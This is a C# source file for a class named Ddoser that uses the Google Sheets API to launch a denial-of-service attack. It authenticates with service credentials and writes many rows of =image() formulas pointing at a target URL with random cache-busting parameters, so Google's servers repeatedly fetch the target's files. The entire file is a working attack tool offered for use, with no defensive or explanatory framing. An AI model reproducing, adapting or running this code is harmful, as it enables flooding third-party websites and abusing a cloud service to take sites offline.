using Google.Apis.Auth.OAuth2;
using Google.Apis.Services;
using Google.Apis.Sheets.v4;
using Google.Apis.Sheets.v4.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

namespace DdosUsingGoogleSheets
{
    public class Ddoser
    {
        const int REQUESTS_INTERVAL = 500;
        static readonly string[] Scopes = { SheetsService.Scope.Spreadsheets };
        readonly string _applicationName;
        readonly SheetsService _service;
        int _limit;
        int _counter;
        private Uri _attackedUri;

        /// <summary>
        /// URI of image or other file from attacked URL
        /// </summary>
        public Uri AttackedUri { get => _attackedUri; set => _attackedUri = value; }

        public int Counter => _counter;

        public Ddoser(string applicationName, string credentialsFileName)
        {
            _applicationName = applicationName;

            GoogleCredential credential;
            using (var stream = new FileStream(credentialsFileName, FileMode.Open, FileAccess.Read))
            {
                credential = GoogleCredential.FromStream(stream)
                    .CreateScoped(Scopes);
            }
            _service = new SheetsService(new BaseClientService.Initializer
            {
                HttpClientInitializer = credential,
                ApplicationName = _applicationName
            });
        }

        public async Task Start(int limit, string attackedUri, string sheetId)
        {
            if (Uri.TryCreate(attackedUri, UriKind.Absolute, out _attackedUri))
                await Task.Run(async () =>
                {
                    _limit = limit;
                    IList<IList<object>> values = new List<IList<object>>();
                    IList<object> data = new List<object>();

                    var body = new ValueRange
                    {
                        Values = values
                    };

                    for (int i = 1; i <= _limit; i++)
                    {
                        for (int number = 0; number < 20; number++)
                        {
                            data.Add($"=image(\"{AttackedUri}?r={Guid.NewGuid()}\")");
                        }

                        _counter++;

                        body.Values.Add(data);

                        await Task.Delay(REQUESTS_INTERVAL);
                        var request = _service.Spreadsheets.Values.Update(body, sheetId, $"A{i}:Z{i}");

                        request.ValueInputOption = SpreadsheetsResource.ValuesResource.UpdateRequest.ValueInputOptionEnum.USERENTERED;

                        try
                        {
                            var result = request.Execute();
                        }
                        catch (Google.GoogleApiException ex)
                        {
                            throw new LimitException(ex.Message);
                        }

                        data.Clear();
                        body.Values.Clear();
                    }
                });
            else throw new ArgumentException("URI is not correct", nameof(attackedUri));
        }
    }
}
